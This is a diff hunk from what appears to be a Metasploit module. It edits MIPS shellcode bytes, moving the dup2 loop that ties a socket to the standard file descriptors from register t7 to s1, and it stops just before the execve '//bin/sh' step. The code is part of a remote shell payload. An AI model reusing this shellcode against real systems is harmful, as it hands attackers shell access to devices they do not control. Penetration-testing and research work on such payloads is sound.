@@ -84,15 +84,15 @@ module Metasploit3
       # sys_dup2
       # a0: oldfd (socket)
       # a1: newfd (0, 1, 2)
-      "\xfd\xff\x0f\x24" + # li t7,-3
-      "\x27\x78\xe0\x01" + # nor t7,t7,zero
+      "\xfd\xff\x11\x24" + # li s1,-3
+      "\x27\x88\x20\x02" + # nor s1,s1,zero
       "\xff\xff\xa4\x8f" + # lw a0,-1(sp)
-      "\x21\x28\xe0\x01" + # move a1,t7
+      "\x21\x28\x20\x02" + # move a1,s1 # dup2_loop
       "\xdf\x0f\x02\x24" + # li v0,4063 # sys_dup2
       "\x0c\x01\x01\x01" + # syscall 0x40404
       "\xff\xff\x10\x24" + # li s0,-1
-      "\xff\xff\xef\x21" + # addi t7,t7,-1
-      "\xfa\xff\xf0\x15" + # bne t7,s0,68 <dup2_loop>
+      "\xff\xff\x31\x22" + # addi s1,s1,-1
+      "\xfa\xff\x30\x16" + # bne s1,s0,68 <dup2_loop>
 
       # sys_execve
       # a0: filename (stored on the stack) "//bin/sh"
